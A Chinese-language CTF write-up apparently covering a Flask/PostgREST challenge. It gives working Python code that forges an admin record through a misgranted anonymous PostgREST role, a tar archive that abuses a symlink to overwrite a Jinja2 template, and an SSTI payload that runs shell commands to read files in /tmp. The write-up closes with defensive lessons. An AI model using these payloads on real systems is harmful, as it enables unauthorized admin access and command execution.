# 博丽神社的御神签

## 题目简述

前端把 Supabase 风格的匿名 JWT 作为 `apikey` 暴露，并经同源 `/rest/v1/*` 代理访问 PostgREST。数据库初始化脚本实际授予 `anon` 对 `public` 全部表和序列的权限，包括管理员表：

```sql
CREATE TABLE public.admins (
    id SERIAL PRIMARY KEY,
    username TEXT,
    password_hash TEXT
);
GRANT ALL PRIVILEGES ON ALL TABLES IN SCHEMA public TO anon;
```

获得后台后，上传端点把任意 tar 包直接解压到 `/app/static`。由于没有在解压前拒绝符号链接，攻击者能用 tar 内的链接把后续条目写到 `/app/templates/index.html`。Flask 启用了模板自动重载，因此覆盖首页模板为 Jinja2 SSTI 即可执行服务进程命令并读取 `/tmp` 下的随机 flag 文件。

## 解题过程

### 伪造管理员记录

前端配置中的 JWT payload 为 `{"role":"anon"}`，它不是管理员凭据，却足以通过反向代理调用 PostgREST。匿名角色对 `admins` 可写，因此不需要破解已有 `reimu` 的 PBKDF2 哈希；直接写入已知口令的记录即可。

登录函数要求的哈希格式和校验逻辑为：

```python
algorithm_id, rounds_text, salt, digest = stored_hash.split("$")[1:]
derived = hashlib.pbkdf2_hmac("sha256", password.encode("utf-8"), salt.encode("utf-8"), int(rounds_text))
return hmac.compare_digest(derived, urlsafe_b64decode(digest + "=" * (-len(digest) % 4)))
```

因此用固定 salt 和任意自选密码生成 MCF 值，再向 `/rest/v1/admins` POST 一条记录即可。请求需带前端公开的 `apikey`、`Authorization: Bearer <同一 JWT>` 和 JSON 正文：

```python
import base64, hashlib, requests

password, salt, rounds = "known-password", "writeup-salt", 240000
digest = hashlib.pbkdf2_hmac("sha256", password.encode(), salt.encode(), rounds)
mcf = "$pbkdf2-sha256$%d$%s$%s" % (
    rounds, salt, base64.urlsafe_b64encode(digest).decode().rstrip("="),
)
headers = {
    "apikey": "<前端的 anon JWT>",
    "Authorization": "Bearer <前端的 anon JWT>",
    "Content-Type": "application/json",
}
requests.post("BASE/rest/v1/admins", headers=headers,
              json={"username": "attacker", "password_hash": mcf}).raise_for_status()
```

随后以 `attacker / known-password` 登录 `/admin/login`，取得 Flask session。PostgREST 的 REST 权限模型与匿名角色由其官方文档说明；本题的问题是 SQL 显式把管理员表也授权给了匿名角色。[PostgREST 权限文档](https://docs.postgrest.org/en/stable/references/auth.html)

### tar 符号链接覆写模板

上传逻辑没有对 archive 成员做安全检查：

```python
subprocess.run(["tar", "-xf", str(archive_path), "-C", str(STATIC_ROOT)], check=True)
```

构造 tar 时先添加 `pivot -> ../templates` 的符号链接，再添加 `pivot/index.html` 普通文件。tar 顺序解包会使后一个条目沿链接写入 `/app/templates/index.html`。模板内容使用 Jinja2 已暴露对象取得 `os` 并输出命令结果：

```python
import io, tarfile

payload = b"{{ cycler.__init__.__globals__.os.popen('find /tmp -type f -maxdepth 1 -exec cat {} \\;').read() }}"
with tarfile.open("theme.tar", "w") as archive:
    link = tarfile.TarInfo("pivot")
    link.type = tarfile.SYMTYPE
    link.linkname = "../templates"
    archive.addfile(link)
    page = tarfile.TarInfo("pivot/index.html")
    page.size = len(payload)
    archive.addfile(page, io.BytesIO(payload))
```

用已登录会话向 `/admin/assets/upload` 提交该 tar，再访问 `/`。`TEMPLATES_AUTO_RELOAD=True` 和 `app.jinja_env.auto_reload=True` 使新模板立即生效，页面正文即为 `/tmp/therealflag_<hash>` 的内容。

### 验证

链路的三个检查点是：匿名请求可创建管理员记录；自建口令可换取后台 session；上传后首页渲染受控命令输出。未针对比赛实例发起请求；结论由题目给出的 SQL、Flask 路由和入口脚本静态验证。

## 方法总结

- 核心技巧：错误的 PostgREST 匿名授权提供后台入口，tar 符号链接解包实现模板覆写，再以 Jinja2 SSTI 取得命令执行。
- 识别信号：前端暴露 anon key、同源 `/rest/v1` 代理、管理员表的写权限，以及 `tar -xf` 解压到可影响模板/静态目录。
- 复用要点：匿名 JWT 只说明请求身份，不说明它应有敏感数据权限；解包必须逐成员拒绝链接和路径穿越，并在隔离目录校验后再移动。模板目录不可被上传内容写入。
